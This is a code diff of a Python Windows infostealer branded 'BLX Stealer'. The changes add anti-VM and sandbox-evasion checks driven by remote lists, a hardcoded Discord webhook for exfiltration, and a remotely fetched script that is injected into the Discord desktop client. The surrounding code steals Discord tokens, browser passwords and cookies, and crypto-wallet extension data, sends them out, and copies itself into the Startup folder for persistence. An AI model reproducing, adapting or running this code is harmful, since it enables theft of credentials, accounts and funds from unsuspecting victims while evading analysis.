@@ -1,18 +1,20 @@
 import os
+import requests
 import threading
 from sys import executable
 from sqlite3 import connect as sql_connect
 import re
 from base64 import b64decode
 from json import loads as json_loads, load
+import ctypes
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
-from tokenize import Token
 from urllib.request import Request, urlopen
 from json import loads, dumps
 import time
 import shutil
 from zipfile import ZipFile
 import random
+import wmi
 import re
 import sys
 import subprocess
@@ -20,40 +22,112 @@ import uuid
 import socket
 import getpass
 
-blacklistUsers = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
+def get_base_prefix_compat():
+    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
 
-username = getpass.getuser()
 
-if username.lower() in blacklistUsers:
-    os._exit(0)
+def in_virtualenv():
+    return get_base_prefix_compat() != sys.prefix
+    
+class Kerpy:
+    def registry_check(self):
+        cmd = "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\"
+        reg1 = subprocess.run(cmd + "DriverDesc", shell=True, stderr=subprocess.DEVNULL)
+        reg2 = subprocess.run(cmd + "ProviderName", shell=True, stderr=subprocess.DEVNULL)
+        if reg1.returncode == 0 and reg2.returncode == 0:
+            print("VMware Registry Detected")
+            sys.exit()
 
-def checkvm():
+    def processes_and_files_check(self):
+        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
+        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    
+    
+        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
+        processList = []
+        for processNames in process.split(" "):
+            if ".exe" in processNames:
+                processList.append(processNames.replace("K\n", "").replace("\n", ""))
 
-    blacklistUsername = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
+        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
+            print("VMwareService.exe & VMwareTray.exe process are running")
+            sys.exit()
+                           
+        if os.path.exists(vmware_dll): 
+            print("Vmware DLL Detected")
+            sys.exit()
+            
+        if os.path.exists(virtualbox_dll):
+            print("VirtualBox DLL Detected")
+            sys.exit()
+        
+        try:
+            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
+            print("Sandboxie DLL Detected")
+            sys.exit()
+        except:
+            pass        
+        
+        processl = requests.get("https://raw.githubusercontent.com/blxstealer/lists/main/process.txt").text
+        if processl in processList:
+            sys.exit()
+            
+    def mac_check(self):
+        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+        mac_list = requests.get("https://raw.githubusercontent.com/blxstealer/lists/main/mac_list.txt").text
+        if mac_address[:8] in mac_list:
+            print("VMware MAC Address Detected")
+            sys.exit()
+    def check_pc(self):
+     vmname = os.getlogin()
+     vm_name = requests.get("https://raw.githubusercontent.com/blxstealer/lists/main/pc_name_list.txt").text
+     if vmname in vm_name:
+         sys.exit()
+     vmusername = requests.get("https://raw.githubusercontent.com/blxstealer/lists/main/pc_username_list.txt").text
+     host_name = socket.gethostname()
+     if host_name in vmusername:
+         sys.exit()
+    def hwid_vm(self):
+     current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
+     hwid_vm = requests.get("https://raw.githubusercontent.com/blxstealer/lists/main/hwid_list.txt").text
+     if current_machine_id in hwid_vm:
+         sys.exit()
+    def checkgpu(self):
+     c = wmi.WMI()
+     for gpu in c.Win32_DisplayConfiguration():
+        GPUm = gpu.Description.strip()
+     gpulist = requests.get("https://raw.githubusercontent.com/blxstealer/lists/main/gpu_list.txt").text
+     if GPUm in gpulist:
+         sys.exit()
+    def check_ip(self):
+     ip_list = requests.get("https://raw.githubusercontent.com/blxstealer/lists/main/ip_list.txt").text
+     reqip = requests.get("https://api.ipify.org/?format=json").json()
+     ip = reqip["ip"]
+     if ip in ip_list:
+         sys.exit()
+    def profiles():
+     machine_guid = uuid.getnode()
+     guid_pc = requests.get("https://raw.githubusercontent.com/blxstealer/lists/main/MachineGuid.txt").text
+     bios_guid = requests.get("https://raw.githubusercontent.com/blxstealer/lists/main/BIOS_Serial_List.txt").text
+     baseboard_guid = requests.get("https://raw.githubusercontent.com/blxstealer/lists/main/BaseBoard_Serial_List.txt").text
+     serial_disk = requests.get("https://raw.githubusercontent.com/blxstealer/lists/main/DiskDrive_Serial_Disk.txt").text
+     if machine_guid in guid_pc:
+         sys.exit()
+     w = wmi.WMI()
+     for bios in w.Win32_BIOS():
+      bios_check = bios.SerialNumber    
+     if bios_check in bios_guid:
+         sys.exit() 
+     for baseboard in w.Win32_BaseBoard():
+         base_check = baseboard.SerialNumber
+     if base_check in baseboard_guid:
+         sys.exit()
+     for disk in w.Win32_DiskDrive():
+      disk_serial = disk.SerialNumber
+     if disk_serial in serial_disk:
+         sys.exit()
 
-    hostname = socket.gethostname()
-
-    if any(name in hostname for name in blacklistUsername):
-        os._exit(0)
-
-checkvm()
-
-BLACKLIST1 = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
-
-mac_address = uuid.getnode()
-if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
-    os._exit(0)
-
-sblacklist = ['88.132.231.71', '207.102.138.83', '174.7.32.199', '204.101.161.32', '207.102.138.93', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167', '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
-
-ip = subprocess.check_output('curl ifconfig.me', shell=True).decode('utf-8').strip()
-
-if ip in sblacklist:
-    exit()
-
-hook = 'YOUR WEBHOOK HERE'
-inj3c710n_url = "https://raw.githubusercontent.com/blxstealer/main/main/index.js"
-color =  0x812118
+h00k = "https://discord.com/api/webhooks/1117403236664615033/MR3FygX8pNJvfBp1N2uiySH8erLHE8FtGIDtQMeawyVHyaprGY15xgfFj0_Y32apbwgQ"
+inj3c710n_url = "https://raw.githubusercontent.com/yagiz011/main/main/index.js"
 DETECTED = False
 
 
@@ -133,14 +207,14 @@ def L04Dr3QU3575(methode, url, data='', files='', headers=''):
         except:
             pass
 
-def L04DUr118(hook, data='', files='', headers=''):
+def L04DUr118(h00k, data='', files='', headers=''):
     for i in range(8):
         try:
             if headers != '':
-                r = urlopen(Request(hook, data=data, headers=headers))
+                r = urlopen(Request(h00k, data=data, headers=headers))
                 return r
             else:
-                r = urlopen(Request(hook, data=data))
+                r = urlopen(Request(h00k, data=data))
                 return r
         except: 
             pass
@@ -187,7 +261,7 @@ def inj3c710n():
                         if 'modules' in dir:
                             module_path = os.path.join(subdir, dir)
                             for subsubdir, subdirs, subfiles in os.walk(module_path):
-                                if 'discord_desktop_core-1' in subsubdir:
+                                if 'discord_desktop_core-' in subsubdir:
                                     for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                         if 'discord_desktop_core' in subsubsubdir:
                                             for file in subsubfiles:
@@ -196,12 +270,11 @@ def inj3c710n():
 
                                                     inj3c710n_cont = requests.get(inj3c710n_url).text
 
-                                                    inj3c710n_cont = inj3c710n_cont.replace("%WEBHOOK%", hook)
+                                                    inj3c710n_cont = inj3c710n_cont.replace("%WEBHOOK%", h00k)
 
                                                     with open(file_path, "w", encoding="utf-8") as index_file:
                                                         index_file.write(inj3c710n_cont)
 inj3c710n()
-
 
 def G37UHQFr13ND5(token):
     badgeList =  [
@@ -238,7 +311,7 @@ def G37UHQFr13ND5(token):
                 flags = flags % badge["Value"]
         if OwnedBadges != '':
             uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
-    return uhqlist 
+    return uhqlist
 
 
 def G3781111N6(token):
@@ -344,17 +417,17 @@ if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower()
     with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
         shutil.copyfileobj(src_file, dst_file)
 
+
 def UP104D70K3N(token, path):
-    global hook
+    global h00k
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
     username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)
 
-
     if pfp == None: 
-        pfp = "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
+        pfp = "https://cdn.discordapp.com/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
@@ -370,7 +443,7 @@ def UP104D70K3N(token, path):
         "content": f'{g108411NF0()} | Found in `{path}`',
         "embeds": [
             {
-            "color": color,
+            "color": 10747904,
             "fields": [
                 {
                     "name": "<:hackerblack:1095747410539593800> Token:",
@@ -413,20 +486,20 @@ def UP104D70K3N(token, path):
                 },
             "footer": {
                 "text": "Wanna Premium? | t.me/blxstealer",
-                "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
+                "icon_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
-        "username": "BLX Stealer | t.me/blxstealer",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1106221978190348298/Picsart_23-05-03_18-16-38-087.jpg",
+        "username": "BLX Stealer",
         "attachments": []
         }
-    L04DUr118(hook, data=dumps(data).encode(), headers=headers)
-    
+    L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
 
+    
 def R3F0rM47(listt):
     e = re.findall("(\w+[a-z])",listt)
     while "https" in e: e.remove("https")
@@ -449,20 +522,20 @@ def UP104D(name, link):
             "content": g108411NF0(),
             "embeds": [
                 {
-                    "title": "BLX Stealer | Cookies",
-                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:blackmember:1095740314683179139>  • **{C00K1C0UNt}** Cookies Found \n <:blackarrow:1095740975197995041> • [BLXCookies.txt]({link})",
-                    "color": color,
+                    "title": "BLX Stealer | Cookies Stealer",
+                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:browser:1095742866518716566> • **{C00K1C0UNt}** Cookies Found\n <:blackarrow:1095740975197995041> • [BLXCookies.txt]({link})",
+                    "color": 10747904,
                     "footer": {
-                        "text": "BLX Stealer",
-                        "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
+                        "text": "Wanna Premium? | t.me/blxstealer",
+                        "icon_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png"
                     }
                 }
             ],
-            "username": "Wanna Premium? | t.me/blxstealer",
-            "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
+            "username": "BLX Stealer",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1106221978190348298/Picsart_23-05-03_18-16-38-087.jpg",
             "attachments": []
             }
-        L04DUr118(hook, data=dumps(data).encode(), headers=headers)
+        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "lxpassw":
@@ -475,20 +548,20 @@ def UP104D(name, link):
             "content": g108411NF0(),
             "embeds": [
                 {
-                    "title": "BLX Stealer | Passwords",
+                    "title": "BLX Stealer | Password Stealer",
                     "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • [BLXPasswords.txt]({link})",
-                    "color": color,
+                    "color": 10747904,
                     "footer": {
-                        "text": "BLX Stealer",
-                        "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
+                        "text": "Wanna Premium? | t.me/blxstealer",
+                        "icon_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png"
                     }
                 }
             ],
-            "username": "Wanna Premium? | t.me/blxstealer",
-            "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
+            "username": "BLX Stealer",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1106221978190348298/Picsart_23-05-03_18-16-38-087.jpg",
             "attachments": []
             }
-        L04DUr118(hook, data=dumps(data).encode(), headers=headers)
+        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "kiwi":
@@ -496,33 +569,33 @@ def UP104D(name, link):
             "content": g108411NF0(),
             "embeds": [
                 {
-                "color": color,
+                "color": 10747904,
                 "fields": [
                     {
-                    "name": "I Found This Files;:",
+                    "name": "I found these files on this PC:",
                     "value": link
                     }
                 ],
                 "author": {
-                    "name": "BLX Stealer | Files"
+                    "name": "BLX Stealer | File Stealer"
                 },
                 "footer": {
                     "text": "Wanna Premium? | t.me/blxstealer",
-                    "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
+                    "icon_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png"
                 }
                 }
             ],
-            "username": "BLX Stealer | t.me/blxstealer",
-            "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
+            "username": "BLX Stealer",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1106221978190348298/Picsart_23-05-03_18-16-38-087.jpg",
             "attachments": []
             }
-        L04DUr118(hook, data=dumps(data).encode(), headers=headers)
+        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
         return
 
 def wr173F0rF113(data, name):
-    path = os.getenv("TEMP") + f"\lx{name}.txt"
+    path = os.getenv("TEMP") + f"\cs{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--BLXStealer-->\n\n")
+        f.write(f"<--BLX Stealer-->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -552,7 +625,7 @@ def g37P455W(path, arg):
     pathC = path + arg + "/Login Data"
     if os.stat(pathC).st_size == 0: return
 
-    tempfold = temp + "lx" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+    tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
@@ -589,7 +662,7 @@ def g37C00K13(path, arg):
     pathC = path + arg + "/Cookies"
     if os.stat(pathC).st_size == 0: return
     
-    tempfold = temp + "lx" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+    tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
     
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
@@ -689,18 +762,18 @@ def G47H3rZ1P5(paths1, paths2, paths3):
             {
             "title": "BLX Stealer | Zips",
             "description": f"{wal}\n{ga}\n{ot}",
-            "color": color,
+            "color": 10747904,
             "footer": {
                 "text": "Wanna Premium? | t.me/blxstealer",
-                "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
+                "icon_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png"
             }
             }
         ],
-        "username": "BLX Stealer | t.me/blxstealer",
-        "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
+        "username": "BLX Stealer",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1077055672899870770/1106221978190348298/Picsart_23-05-03_18-16-38-087.jpg",
         "attachments": []
     }
-    L04DUr118(hook, data=dumps(data).encode(), headers=headers)
+    L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
 
 
 def Z1P73136r4M(path, arg, procc):
@@ -734,11 +807,6 @@ def Z1P7H1N65(path, arg, procc):
     if "ejbalbakoplchlghecdalmeeeajnimhm" in arg:
         browser = path.split("\\")[4].split("/")[1].replace(' ', '')
         name = f"Metamask_Edge"
-        pathC = path + arg
-
-    if "djclckkglechooblngghdinmeemkbgci" in arg:
-        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
-        name = f"Metamask_OperaGX"
         pathC = path + arg
 
     if "fhbohimaelbohpjbbldcngcnapndodjp" in arg:
@@ -796,14 +864,14 @@ def Z1P7H1N65(path, arg, procc):
         G4M1N6Z1p.append([name, lnik])
     else:
         O7H3rZ1p.append([name, lnik])
-        
+
 
 def G47H3r411():
     '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
     br0W53rP47H5 = [
-        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/djclckkglechooblngghdinmeemkbgci"                      ],
-        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/djclckkglechooblngghdinmeemkbgci"                      ],
-        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/djclckkglechooblngghdinmeemkbgci"                      ],
+        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
+        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
+        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
         [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
         [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"              ],
         [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"              ],
